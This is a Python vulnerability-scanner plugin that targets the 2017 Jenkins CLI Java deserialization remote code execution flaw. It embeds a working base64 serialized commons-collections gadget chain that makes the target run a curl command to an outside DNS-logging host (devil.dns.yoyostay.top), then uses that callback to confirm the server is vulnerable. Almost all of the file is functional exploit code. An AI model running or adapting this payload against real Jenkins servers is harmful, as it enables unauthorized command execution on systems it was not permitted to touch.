#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from config import *
import socket
import random
import base64
import time
import threading
import uuid
import urllib2
socket.setdefaulttimeout(10)

PREAMLE = b'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='
PROTO = b'\x00\x00\x00\x00'
PAYLOAD = base64.b64decode('rO0ABXNyAC9vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLlJlZmVyZW5jZU1hcBWUygOYSQjXAwAAeHB3EQAAAAAAAAABAD9AAAAAAAAQc3IAKGphdmEudXRpbC5jb25jdXJyZW50LkNvcHlPbldyaXRlQXJyYXlTZXRLvdCSkBVp1wIAAUwAAmFsdAArTGphdmEvdXRpbC9jb25jdXJyZW50L0NvcHlPbldyaXRlQXJyYXlMaXN0O3hwc3IAKWphdmEudXRpbC5jb25jdXJyZW50LkNvcHlPbldyaXRlQXJyYXlMaXN0eF2f1UarkMMDAAB4cHcEAAAAAnNyACpqYXZhLnV0aWwuY29uY3VycmVudC5Db25jdXJyZW50U2tpcExpc3RTZXTdmFB5vc/xWwIAAUwAAW10AC1MamF2YS91dGlsL2NvbmN1cnJlbnQvQ29uY3VycmVudE5hdmlnYWJsZU1hcDt4cHNyACpqYXZhLnV0aWwuY29uY3VycmVudC5Db25jdXJyZW50U2tpcExpc3RNYXCIRnWuBhFGpwMAAUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHBwc3IAGmphdmEuc2VjdXJpdHkuU2lnbmVkT2JqZWN0Cf+9aCo81f8CAANbAAdjb250ZW50dAACW0JbAAlzaWduYXR1cmVxAH4ADkwADHRoZWFsZ29yaXRobXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdXIAAltCrPMX+AYIVOACAAB4cAAABUys7QAFc3IAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHcMAAAAAj9AAAAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADZm9vc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABtzcQB+ABN1cQB+ABgAAAACcHVxAH4AGAAAAAB0AAZpbnZva2V1cQB+ABsAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAUy91c3IvYmluL2N1cmwgaHR0cDovL2FjNTkwNzViOTY0YjA3MTUuN2VjYjcyYmUuZG5zbG9nLmxpbmsvamVua2luc191bnNlcmlhbGl6ZV8yMDE3dAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHh1cQB+ABEAAAAvMC0CFAqK4c2IuIpr/Xmeca/11akZlVHLAhUAkaZLtmU0fQtVPeixHlj1g+6ajjV0AANEU0FzcgARamF2YS5sYW5nLkJvb2xlYW7NIHKA1Zz67gIAAVoABXZhbHVleHABcHhzcgAxb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLnNldC5MaXN0T3JkZXJlZFNldPzTnvb6HO1TAgABTAAIc2V0T3JkZXJ0ABBMamF2YS91dGlsL0xpc3Q7eHIAQ29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5zZXQuQWJzdHJhY3RTZXJpYWxpemFibGVTZXREZWNvcmF0b3IRD/RrlhcOGwMAAHhwc3IAFW5ldC5zZi5qc29uLkpTT05BcnJheV0BVG9cKHLSAgACWgAOZXhwYW5kRWxlbWVudHNMAAhlbGVtZW50c3EAfgAYeHIAGG5ldC5zZi5qc29uLkFic3RyYWN0SlNPTuiKE/T2mz+CAgAAeHAAc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAF3BAAAAAF0AARhc2RmeHhzcQB+AB4AAAAAdwQAAAAAeHhxAH4AIHNxAH4AAnNxAH4ABXcEAAAAAnEAfgAacQB+AAl4cQB+ACBweA==')
rand_str = ''
bugscan_str = 'ac59075b964b0715.7ecb72be.dnslog.link'
bugscan_len = len(bugscan_str)
domain = 'devil.dns.yoyostay.top'
domain_len = len(domain)
rand_len = bugscan_len - domain_len - 1
for i in range(rand_len):
    rand_str = rand_str + chr(ord('a')+random.randint(0,25))
PAYLOAD = PAYLOAD.replace(bugscan_str, rand_str + '.' + domain)

def check(site, _dir, app, lang):
    if 'jenkins' in app.split(',') or 'hudson' in app.split(','):
        return True
    return False

def create_payload_chunked():
    yield PREAMLE
    yield PROTO
    yield PAYLOAD

def null_payload():
    yield b" "

def download(url, session):
    try:
        headers = {'Connection':'keep-alive', 'Accept':'*/*', 'Transfer-Encoding':'chunked', 'Session':session, 'Content-type':'application/x-www-form-urlencoded', 'Side':'download'}
        http_request_post(url, null_payload(), headers=headers)
    except:
        pass

def verify(ip, port=80, name=None, timeout=10, types='ip'):
    if types == 'ip':
        url = ip + ':' + str(port)
    else:
        url = ip
    if not url.startswith('http:/') or not url.startswith('https:/'):
        url = 'http://' + url

    try:
        url = url.rstrip('/') + '/cli'
        session = str(uuid.uuid4())
        t = threading.Thread(target=download, args=(url, session))
        t.start()
        time.sleep(1)
        headers = {'Connection':'keep-alive', 'Accept':'*/*', 'Transfer-Encoding':'chunked', 'Session':session, 'Cache-Control':'no-cache', 'Content-type':'application/octet-stream', 'Side':'upload'}
        http_request_post(url, create_payload_chunked(), headers=headers)
        time.sleep(10)
        if check_remote_web(rand_str):
            details = 'Jenkins Unserialize 2017 RCE %s' % (url)
            # target = site + _dir
            info = {
                'url': url,
                'severity': 'high',
                'vuln_name': 'jenkins unserialized 2017',
                'proof': details,
            }
            return info
    except Exception, e:
        pass
